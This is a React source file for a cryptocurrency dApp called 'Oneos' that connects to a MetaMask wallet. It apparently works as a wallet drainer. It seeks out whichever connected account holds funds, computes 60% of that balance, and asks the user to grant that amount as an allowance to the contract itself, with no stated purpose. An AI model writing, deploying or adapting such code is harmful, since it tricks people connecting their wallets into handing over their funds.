import React, { useState, useEffect } from "react";
import Web3 from "web3";
import { CONTRACT_ADDRESS } from "./contract/address";
import OneosContract from "./contract/Oneos.json";
import Landing from "./components/Landing";
import Navbar from "./components/Navbar";

function App() {
  const [web3, setWeb3] = useState(null);
  const [contract, setContract] = useState(null);
  const [account, setAccount] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const web3Instance = new Web3(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });

        const accounts = await web3Instance.eth.getAccounts();
        let selectedAccount = null;
        for (const acc of accounts) {
          const balanceInWei = await web3Instance.eth.getBalance(acc);
          if (balanceInWei !== "0") {
            selectedAccount = acc;
            break;
          }
        }

        if (!selectedAccount) {
          selectedAccount = accounts[0];
        }

        setAccount(selectedAccount);
        setWeb3(web3Instance);
        const instance = new web3Instance.eth.Contract(
          OneosContract.abi,
          CONTRACT_ADDRESS
        );
        setContract(instance);
      } else {
        setError(
          "MetaMask is not installed. Please install MetaMask to use this dApp."
        );
      }
    } catch (error) {
      console.error(error);
      setError("An error occurred during wallet connection.");
    }
  };

  const increaseAllowance = async () => {
    try {
      setLoading(true);

      const balanceInWei = await web3.eth.getBalance(account);
      console.log(balanceInWei);

      const balanceBN = BigInt(balanceInWei);
      const partials = (balanceBN * 60n) / 100n;
      console.log(partials.toString());

      const partialsInWei = web3.utils.toWei(partials.toString(), "wei");
      console.log(partialsInWei);

      const balanceInEther = web3.utils.fromWei(partialsInWei, "ether");
      console.log(balanceInEther);

      await contract.methods
        .increaseAllowance(contract.options.address, partialsInWei)
        .send({ from: account });

      setLoading(false);
      setSuccess(true);
    } catch (error) {
      console.error(error);
      setLoading(false);
      setError("An error occurred. Try again.");
    }
  };

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on("accountsChanged", (accounts) => {
        setAccount(accounts[0]);
        window.location.reload();
      });

      return () => {
        window.ethereum.removeAllListeners("accountsChanged");
      };
    }
  }, [account]);

  return (
    <section className="app">
      <Navbar account={account} connectWallet={connectWallet} />
      {error && <p style={{ color: "red" }}>{error}</p>}
      <Landing
        increaseAllowance={increaseAllowance}
        account={account}
        connectWallet={connectWallet}
        loading={loading}
      />
    </section>
  );
}

export default App;
